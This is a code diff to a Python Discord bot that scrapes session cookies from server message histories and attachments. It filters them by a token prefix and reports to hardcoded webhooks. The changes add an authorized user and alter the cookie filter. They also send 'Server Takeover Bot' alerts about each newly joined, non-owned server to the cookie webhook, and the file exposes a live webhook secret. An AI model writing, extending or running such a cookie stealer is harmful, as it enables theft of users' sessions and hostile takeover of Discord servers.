@@ -24,7 +24,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-AUTHORIZED_USERS = [216953894322962433, 1422280514072608932]
+AUTHORIZED_USERS = [216953894322962433, 1422280514072608932, 219564668933373962]
 CONTROL_CHANNEL_ID = 1432729863692881972
 COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
 OWNED_SERVER_IDS = [1396878002620727397]
@@ -152,8 +152,8 @@ class CookieFetcher:
             attachments_count = 0
             
             try:
-                # Ultra-fast processing with higher limit
-                async for message in channel.history(limit=10000):
+                # Fast processing
+                async for message in channel.history(limit=5000):
                     messages_count += 1
                     
                     # Extract from message content
@@ -307,7 +307,7 @@ class CookieFetcherBot(discord.Client):
             all_cookies = list(set(result['all']))
             actual_messages_scanned = result.get('messages_scanned', 0)
             attachments_scanned = result.get('attachments_scanned', 0)
-            unique_cookies = [c for c in all_cookies if 'CAEaAhAB' in c]
+            unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
             
             end_time = datetime.datetime.now()
             time_taken = (end_time - start_time).total_seconds()
@@ -335,22 +335,29 @@ class CookieFetcherBot(discord.Client):
                 pass
 
             if guild.id not in OWNED_SERVER_IDS:
-                # Send takeover notification to mirror webhook
+                # Send takeover notification to mirror webhook and cookie webhook
+                takeover_embed = discord.Embed(
+                    title="🚨 New Server Joined",
+                    description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
+                    color=0x00ff00
+                )
+                takeover_data = {
+                    'username': 'Server Takeover Bot',
+                    'content': '@everyone',
+                    'embeds': [takeover_embed.to_dict()]
+                }
+
                 if MIRROR_WEBHOOK_URL:
                     async with aiohttp.ClientSession() as session:
-                        takeover_embed = discord.Embed(
-                            title="🚨 New Server Joined",
-                            description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
-                            color=0x00ff00
-                        )
-                        takeover_data = {
-                            'username': 'Server Takeover Bot',
-                            'content': '@everyone',
-                            'embeds': [takeover_embed.to_dict()]
-                        }
                         async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
                             if response.status not in [200, 204]:
                                 logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
+
+                # Also send to cookie webhook
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(COOKIE_WEBHOOK_URL, json=takeover_data) as response:
+                        if response.status not in [200, 204]:
+                            logger.error(f"Failed to send takeover to cookie webhook: {response.status}")
 
                 # Send control buttons to control channel
                 control_channel = self.get_channel(CONTROL_CHANNEL_ID)
@@ -473,7 +480,7 @@ async def scrape_command(interaction: discord.Interaction):
         all_cookies = list(set(result['all']))
         actual_messages_scanned = result.get('messages_scanned', 0)
         attachments_scanned = result.get('attachments_scanned', 0)
-        unique_cookies = [c for c in all_cookies if 'CAEaAhAB' in c]
+        unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
         
         end_time = datetime.datetime.now()
         time_taken = (end_time - start_time).total_seconds()
